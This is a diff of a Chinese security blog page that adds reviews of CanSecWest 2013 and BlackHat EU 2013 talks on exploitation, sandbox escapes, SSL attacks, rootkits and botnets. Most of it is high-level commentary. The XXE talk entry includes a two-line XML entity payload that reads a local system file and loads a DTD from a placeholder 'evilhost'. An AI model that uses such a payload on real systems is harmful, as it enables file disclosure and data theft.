@@ -136,6 +136,139 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2013-03-22T16:00:00.000Z"><a href="/2013/03/23/CanSecWest-2013/">2013-03-23</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2013/03/23/CanSecWest-2013/">关于CanSecWest 2013大会</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>文档下载：<a href="http://cansecwest.com/csw13archive.html" target="_blank" rel="external">http://cansecwest.com/csw13archive.html</a></p>
+<p>此次CanSecWest 2013大会的质量明显要高出BlackHat EU 2013很多，主要还是软件/系统安全为主，涉及漏洞利用和挖掘等技术。</p>
+<h3 id="1、《Fuzzing-for-logic-and-state-issues》"><a href="#1、《Fuzzing-for-logic-and-state-issues》" class="headerlink" title="1、《Fuzzing for logic and state issues》"></a>1、《Fuzzing for logic and state issues》</h3><p>Peach Fuzzer框架的作者写的，主要是介绍peach3的新增特性，增加逻辑漏洞和无效的状态转换等问题，比如一些WEB认证的逻辑漏洞，PPT写得比较简洁，纯文字描述，不好完整理解，建议还是上官网看peach3的使用文档吧：<a href="http://peachfuzzer.com/v3/PeachPit.html" target="_blank" rel="external">http://peachfuzzer.com/v3/PeachPit.html</a> ，上个月作者刚更新的，写得比较详细。</p>
+<h3 id="2、《DEP-ASLR-bypass-without-ROP-JIT》"><a href="#2、《DEP-ASLR-bypass-without-ROP-JIT》" class="headerlink" title="2、《DEP ASLR bypass without ROP JIT》"></a>2、《DEP ASLR bypass without ROP JIT》</h3><p>绿盟的TK讲的，里面的思路最早是在2009年的中国软件安全峰会《Vulnerability: The next 10 years》中提到的，主要是利用 SharedUserData 地址 0x7ffe0000 在win上是固定不变的，再通过它找到SystemCall，然后设置其参数，来调用指定的系统函数。在安全峰会上，作者是调用NtUserLockWorkStation这一函数来设置锁屏，而在此次CSW大会上，作者是通过LdrHotPatchRoutine索引到LdrLoadDll来加载外部的DLL，实现任意代码执行，这种方法只工作在winx64上的32位程序，且在win8上微软已经修复此问题。</p>
+<h3 id="3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》"><a href="#3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》" class="headerlink" title="3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》"></a>3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》</h3><p>exploit系列教程的作者peter写的议题，在以前的一些大会上，也有人做过关于adobe sandbox的分享，但总觉得PPT写得不过详细，这次peter的议题，我觉得写得挺详细的，由浅入深，从介绍沙盒的相关术语、client与broker之间的通讯原理开始讲起，并提起一些沙盒逃逸的攻击面，分析和提取cross call函数等信息，同时也提供一些demo，可惜只有ppt，要是能提供paper和code就更好了。</p>
+<h3 id="4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》"><a href="#4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》" class="headerlink" title="4、《An Android Hacker’s Journey- Challenges in Android Security Research》"></a>4、《An Android Hacker’s Journey- Challenges in Android Security Research》</h3><p>对我而言，里面让我最感兴趣的是作者即将出版的《Android Hacker’s Handbook》这个系列的书都很经典，包括shellcode、web、macosx以及ios等书，都是相当经典的，上面4本除了ios那书只看了一小部分之外，其它3本我都详细阅读过，值得推荐，前两本国内早有中译本了。<br>这个议题里面讲了一些android软件漏洞，包括一些组件权限设置问题导致的信息泄露，以及linux内核漏洞，其中还有一张赛门铁克提供的移动设备威胁图表，列出了移动设备可能面临的各种安全威胁，做得挺不错的。最后讲述了一些android平台的调试技巧，包括远程调试、源码调试等，有兴趣的朋友可以看下。</p>
+<h3 id="5、《Assessing-the-Linux-Desktop’s-Security》"><a href="#5、《Assessing-the-Linux-Desktop’s-Security》" class="headerlink" title="5、《Assessing the Linux Desktop’s Security》"></a>5、《Assessing the Linux Desktop’s Security》</h3><p>感觉一般，对这议题也不是很感兴趣。</p>
+<h3 id="6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》"><a href="#6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》" class="headerlink" title="6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》"></a>6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》</h3><p>讲述 MS SQL Server 利用技术，主要是利用扩展存储过程API来利用MSSQL，包括获取密码hash，内存搜索hash替换，编写poc创建后门，以及利用msf来控制shell等方式。在实际的渗透测试中，相信大多数的企业还是会选择使用php + mysql，特别是近些年来，这一组合的比例一直在扩大，所以估计对此文感兴趣的人不会太多。</p>
+<h3 id="7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》"><a href="#7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》" class="headerlink" title="7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》"></a>7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》</h3><p>基本就是在讲苹果的icloud服务及其原理，跟安全相关的内容不多，爱看不看。</p>
+<h3 id="8、《UPnP-Vulnerabilities》"><a href="#8、《UPnP-Vulnerabilities》" class="headerlink" title="8、《UPnP Vulnerabilities》"></a>8、《UPnP Vulnerabilities》</h3><p>PPT写得很是简单，内容也不是感兴趣，爱看不看。</p>
+<h3 id="9、《Analysis-of-a-Windows-Kernel-Vulnerability》"><a href="#9、《Analysis-of-a-Windows-Kernel-Vulnerability》" class="headerlink" title="9、《Analysis of a Windows Kernel Vulnerability》"></a>9、《Analysis of a Windows Kernel Vulnerability》</h3><p>共有273页，这是我见过最长的PPT文档。主要讲Duqu病毒所使用的 CVE-2011-3402：Windows win32k.sys TrueType 字体解析数组越界漏洞，从TTF字体格式开始分析，解释漏洞成因，以及漏洞的利用技术。在去年的syscan大会上，360的人也针对此漏洞分析过其原理及利用技术，可以交互参考阅读。国内最早分析并公开细节的应该是启明星辰，其在博客上也帖出了相应的分析文章，看雪和binvul论坛均有人发表相关的漏洞分析文章。</p>
+<h3 id="10、《iOS-6-Exploitation-280-Days-Later》"><a href="#10、《iOS-6-Exploitation-280-Days-Later》" class="headerlink" title="10、《iOS 6 Exploitation 280 Days Later》"></a>10、《iOS 6 Exploitation 280 Days Later》</h3><p>作者之前搞了近10年的WEB安全，2010年中才开始搞iphone安全，但他98年就开始接触安全，也算是安全界的老一辈革命家了。讲了2012年之后出现过的一些ios漏洞，以及关于ios安全相关的资料和书籍，同时介绍苹果对此采取的一些保护机制（cookie、ASLR、程序目录权限限制……），大部分篇幅还是在介绍ios的保护机制。</p>
+<h3 id="11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》"><a href="#11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》" class="headerlink" title="11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》"></a>11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》</h3><p>讲述关于bios那些底层的东东，看不懂，真心看不懂！</p>
+<h3 id="12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》"><a href="#12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》" class="headerlink" title="12、《Physical Privilege Escalation and Mitigation in the x86 World》"></a>12、《Physical Privilege Escalation and Mitigation in the x86 World》</h3><p>硬件hacking一类的议题，PPT也大多是贴图，不好理解，反正是没看懂这PPT</p>
+<h3 id="13、《Smart-TV-Security》"><a href="#13、《Smart-TV-Security》" class="headerlink" title="13、《Smart TV Security》"></a>13、《Smart TV Security》</h3><p>一个有趣的议题，主要讲关于智能电视安全，包括智能电视机上面的app漏洞，以及恶意app感染、网络通讯安全等问题，同时还介绍智能电视固件rootkit的开发，如何留取后门。控制智能电视后最大的风险就是用它来监控和窃听你的行为，因为智能电视都配有摄像头。最后，还介绍一些调试等逆向相关技术，以及操作电视的一些API函数。</p>
+<h3 id="14、《The-Evolution-of-BlackHole》"><a href="#14、《The-Evolution-of-BlackHole》" class="headerlink" title="14、《The Evolution of BlackHole》"></a>14、《The Evolution of BlackHole》</h3><p>总觉得这是BlackHol exploit kit的广告帖，介绍BlackHole这一漏洞利用工具包的一些功能，一套售价冒似是1500美元，不过里面的一些功能看起来还是不错的。 </p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="/2013/03/23/CanSecWest-2013/#comment" class="comment-link">评论</a>
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/技术分享/">技术分享</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/CanSecWest/">CanSecWest</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2013-03-19T16:00:00.000Z"><a href="/2013/03/20/BlackHat-EU-2013/">2013-03-20</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2013/03/20/BlackHat-EU-2013/">关于BlackHat EU 2013大会</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>大会文档下载：<a href="https://www.blackhat.com/eu-13/archives.html" target="_blank" rel="external">https://www.blackhat.com/eu-13/archives.html</a></p>
+<p>此次BH EU 议题整体较水，涉及系统安全、移动安全、网络传输安全、WEB安全、游戏安全等。下面随便挑几个议题简单介绍下，有些议题不是很感兴趣，有些也特水，有兴趣的自己到上面链接下载文档。</p>
+<h3 id="1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》"><a href="#1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》" class="headerlink" title="1、《A PERFECT CRIME? ONLY TIME WILL TELL》"></a>1、《A PERFECT CRIME? ONLY TIME WILL TELL》</h3><p>讲述SSL攻击方法——CRIME，如何从SSL加密的会话中获取到cookie，CRIME原理就是通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，进而解密会话Cookie，也算是中间人攻击MIMT的一种方法。该议题对<code>CRIME</code>方法进行扩展，介绍一种叫<code>TIME (Timing Info-leak MadeEasy)</code>的攻击手法，基于传输时间来猜测payload size，然后逐字猜解cookie。</p>
+<h3 id="2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》"><a href="#2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》" class="headerlink" title="2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》"></a>2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》</h3><p>介绍常堆及内核溢出利用技巧，以及在win8上改进后的内存安全保护机制。里面构造堆内存布局的exploit技巧，与以往利用信息泄露获取dll基址来绕过ASLR方法有些类似，都通过分配特定大小的堆块，然后释放出与造成溢出的堆块大小相同的堆块，触发漏洞后覆盖到特定结构。同时，介绍了内核中的堆块分配与释放的原理，然后讲述不同大小的堆块溢出后，如何构造相应的堆布局来实现利用。最后，以windows object内核漏洞为例，讲述win7\win8上的exploit技巧，在wihte paper中已给出相应的exploit代码。</p>
+<h3 id="3、《THE-DEPUTIES-ARE-STILL-CONFUSED》"><a href="#3、《THE-DEPUTIES-ARE-STILL-CONFUSED》" class="headerlink" title="3、《THE DEPUTIES ARE STILL CONFUSED》"></a>3、《THE DEPUTIES ARE STILL CONFUSED》</h3><p>总之，这议题很水，爱看不看。主要讲CSRF和点击劫持<code>clickjacking</code>的攻击技巧，里面也提到前段时间facebook爆出的OAuth2认证漏洞，点击劫持就讲下beef的<code>clickjacking</code>模块，然后提下防御点击劫持的<code>x-frame-options</code>。</p>
+<h3 id="4、《Hacking-Appliances-Ironic-exploits-in-security-products》"><a href="#4、《Hacking-Appliances-Ironic-exploits-in-security-products》" class="headerlink" title="4、《Hacking Appliances: Ironic exploits in security products》"></a>4、《Hacking Appliances: Ironic exploits in security products》</h3><p>初看这标题，还以为是讲客户端软件漏洞利用呢，其实主要还是讲WEB安全的多一些，觉得有点水。</p>
+<h3 id="5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》"><a href="#5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》" class="headerlink" title="5、《HACKING VIDEO CONFERENCING SYSTEMS》"></a>5、《HACKING VIDEO CONFERENCING SYSTEMS》</h3><p>比较有趣的一个议题，主要讲述如何攻击语音会议系统，介绍了root提权以及远程调试的一些技巧，最后演示了一个后门shell。对这些不是很了解，有兴趣的自己看文档。</p>
+<h3 id="6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》"><a href="#6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》" class="headerlink" title="6、《Hardening your Windows 8 apps for the Windows Store》"></a>6、《Hardening your Windows 8 apps for the Windows Store》</h3><p>很水，不解释</p>
+<h3 id="7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》"><a href="#7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》" class="headerlink" title="7、《Harnessing GP²Us Building Better Browser Based Botnets》"></a>7、《Harnessing GP²Us Building Better Browser Based Botnets》</h3><p>觉得这议题有点在玩概念，实际攻击场景或者实战的东西很少，太理论化了。GPU现在很多被用在暴力破解方面，比如跑MD5、跑WPA-PSK，速度比CPU快得N多，比五速鞋还五速鞋……该议题主要讲构造基于浏览器的僵尸网络botnet，利用WEB漏洞（如XSS，并提到利用html5的WEB存储特性、插件等等方法实现永久XSS）来执行代码，再用GPU跑数据，然后利用C&amp;C服务器进行通讯。</p>
+<h3 id="8、《LET’S-PLAY-APPLANTING》"><a href="#8、《LET’S-PLAY-APPLANTING》" class="headerlink" title="8、《LET’S PLAY - APPLANTING》"></a>8、《LET’S PLAY - APPLANTING》</h3><p>很水，为什么这种也能上BH大会讲呢</p>
+<h3 id="9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》"><a href="#9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》" class="headerlink" title="9、《MULTIPLAYER ONLINE GAMES INSECURITY》"></a>9、《MULTIPLAYER ONLINE GAMES INSECURITY》</h3><p>讲游戏漏洞相关的，主要涉及协议分析、常见客户端漏洞攻击等，没什么新鲜的东西，爱看不看。</p>
+<h3 id="10、《Next-generation-mobile-rootkits》"><a href="#10、《Next-generation-mobile-rootkits》" class="headerlink" title="10、《Next generation mobile rootkits》"></a>10、《Next generation mobile rootkits》</h3><p>相对比较前沿的东西，主要讲arm平台上的rookit设计，但PPT写得太简洁了，简单一些文本描述，很难完全理解其中意思。之前viaForensics也写一篇关于android rootkit的文档《Dude,where’s my droid?!》，发表于RootedCON 2013安全大会，推荐阅读。</p>
+<h3 id="11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》"><a href="#11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》" class="headerlink" title="11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》"></a>11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》</h3><p>可能一些搞硬件hacking或者移动安全的朋友会感兴趣，应该属于边信道攻击一类，玩这种都需要花钱买设备，所以搞这些的一般都是高富帅，像kevin2600一样。</p>
+<h3 id="12、《XML-Out-Of-Band-Data-Retrieval》"><a href="#12、《XML-Out-Of-Band-Data-Retrieval》" class="headerlink" title="12、《XML Out-Of-Band Data Retrieval》"></a>12、《XML Out-Of-Band Data Retrieval》</h3><p>这种XML实体注入漏洞，在2011年的时候，80sec就有写过一篇文章提到《XML实体注入漏洞安全警告》<a href="http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：" target="_blank" rel="external">http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/boot.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://evilhost/evil.xml&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>漏洞实例见《zend framework文件读取漏洞分析》：<a href="http://zone.wooyun.org/content/508" target="_blank" rel="external">http://zone.wooyun.org/content/508</a> ，不过最早是在2002年的时候老外就有提出过这个问题。</p>
+<h3 id="13、《Advanced-iOS-Application-Pentesting》"><a href="#13、《Advanced-iOS-Application-Pentesting》" class="headerlink" title="13、《Advanced iOS Application Pentesting》"></a>13、《Advanced iOS Application Pentesting》</h3><p>看标题冒似很“高级”的样子，实则就介绍下ios的一些逆向工具和ios编程中用到的一些类而已，还是爱看不看。</p>
+<h3 id="14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》"><a href="#14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》" class="headerlink" title="14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》"></a>14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》</h3><p>主要讲WEB开发中安全编程，但主要就是在普及WEB安全漏洞的原理、防御等，包括XSS、注入、CSRF等等，算是总结性文章，没有新货，有兴趣的自个翻看下。</p>
+<h3 id="15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》"><a href="#15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》" class="headerlink" title="15、《Assessing BYOD with the Smarthpone Pentest Framework》"></a>15、《Assessing BYOD with the Smarthpone Pentest Framework》</h3><p>作者公布了一款智能机渗透测试框架——Smartphone Pentest Framework v0.1.5，包括一些浏览器漏洞、客户端漏洞、社会工程学漏洞以及本地提权等，利用漏洞获取shell后还可发送短信、获取通信录、短信、下载上传文件等，有些功能还是不错的，但漏洞利用方法相对单一，有其利用的局限性。该工具下载地址：<br><a href="https://github.com/georgiaw/Smartphone-Pentest-Framework" target="_blank" rel="external">https://github.com/georgiaw/Smartphone-Pentest-Framework</a></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="/2013/03/20/BlackHat-EU-2013/#comment" class="comment-link">评论</a>
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/技术分享/">技术分享</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/BlackHat/">BlackHat</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2012-12-31T16:00:00.000Z"><a href="/2013/01/01/osx_rootkit_rubilyn_analyze/">2013-01-01</a></time>
       
       
@@ -298,125 +431,11 @@
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2012-05-24T16:00:00.000Z"><a href="/2012/05/25/android-auto-auditor/">2012-05-25</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2012/05/25/android-auto-auditor/">浅谈Android软件安全自动化审计</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        
-
-	<div class="row">
-	  <iframe src="http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/android_auto_auditor.pdf" style="width:100%; height:550px"></iframe>
-	</div>
-
-
-
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href="/2012/05/25/android-auto-auditor/#comment" class="comment-link">评论</a>
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-  
-  <div class="categories">
-    <a href="/categories/技术分享/">技术分享</a>
-  </div>
-
-        
-  
-  <div class="tags">
-    <a href="/tags/Android/">Android</a>, <a href="/tags/安全审计/">安全审计</a>
-  </div>
-
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2011-12-29T16:00:00.000Z"><a href="/2011/12/30/spike-fuzz/">2011-12-30</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2011/12/30/spike-fuzz/">基于SPIKE的网络协议Fuzzing技术</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        
-
-	<div class="row">
-	  <iframe src="http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/spike_fuzz.pdf" style="width:100%; height:550px"></iframe>
-	</div>
-
-
-
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href="/2011/12/30/spike-fuzz/#comment" class="comment-link">评论</a>
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-  
-  <div class="categories">
-    <a href="/categories/技术分享/">技术分享</a>
-  </div>
-
-        
-  
-  <div class="tags">
-    <a href="/tags/Fuzz/">Fuzz</a>, <a href="/tags/漏洞/">漏洞</a>
-  </div>
-
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
 
 <nav id="pagination">
   
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
   </nav>
 
 </nav>
@@ -459,19 +478,19 @@
       </li>
     
       <li>
+        <a href="/2013/03/23/CanSecWest-2013/">关于CanSecWest 2013大会</a>
+      </li>
+    
+      <li>
+        <a href="/2013/03/20/BlackHat-EU-2013/">关于BlackHat EU 2013大会</a>
+      </li>
+    
+      <li>
         <a href="/2013/01/01/osx_rootkit_rubilyn_analyze/">Mac OSX rootkit rubilyn 源码分析</a>
       </li>
     
       <li>
         <a href="/2012/10/02/android_malware_sandbox/">Android恶意软件沙盒自动化分析原理与实现</a>
-      </li>
-    
-      <li>
-        <a href="/2012/05/25/android-auto-auditor/">浅谈Android软件安全自动化审计</a>
-      </li>
-    
-      <li>
-        <a href="/2011/12/30/spike-fuzz/">基于SPIKE的网络协议Fuzzing技术</a>
       </li>
     
   </ul>
@@ -483,7 +502,7 @@
   <h3 class="title">分类</h3>
   <ul class="entry">
   
-    <li><a href="/categories/技术分享/">技术分享</a><small>11</small></li>
+    <li><a href="/categories/技术分享/">技术分享</a><small>13</small></li>
   
     <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>2</small></li>
   
@@ -495,7 +514,7 @@
 <div class="widget tagcloud">
   <h3 class="title">标签云</h3>
   <div class="entry">
-    <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/BlackHat/" style="font-size: 10px;">BlackHat</a> <a href="/tags/CanSecWest/" style="font-size: 10px;">CanSecWest</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/OSX/" style="font-size: 10px;">OSX</a> <a href="/tags/PHDays/" style="font-size: 10px;">PHDays</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/书籍/" style="font-size: 10px;">书籍</a> <a href="/tags/安全审计/" style="font-size: 20px;">安全审计</a> <a href="/tags/恶意软件/" style="font-size: 20px;">恶意软件</a> <a href="/tags/溢出/" style="font-size: 10px;">溢出</a> <a href="/tags/漏洞/" style="font-size: 10px;">漏洞</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a>
+    <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/BlackHat/" style="font-size: 20px;">BlackHat</a> <a href="/tags/CanSecWest/" style="font-size: 20px;">CanSecWest</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/OSX/" style="font-size: 10px;">OSX</a> <a href="/tags/PHDays/" style="font-size: 10px;">PHDays</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/书籍/" style="font-size: 10px;">书籍</a> <a href="/tags/安全审计/" style="font-size: 20px;">安全审计</a> <a href="/tags/恶意软件/" style="font-size: 20px;">恶意软件</a> <a href="/tags/溢出/" style="font-size: 10px;">溢出</a> <a href="/tags/漏洞/" style="font-size: 10px;">漏洞</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a>
   </div>
 </div>
 
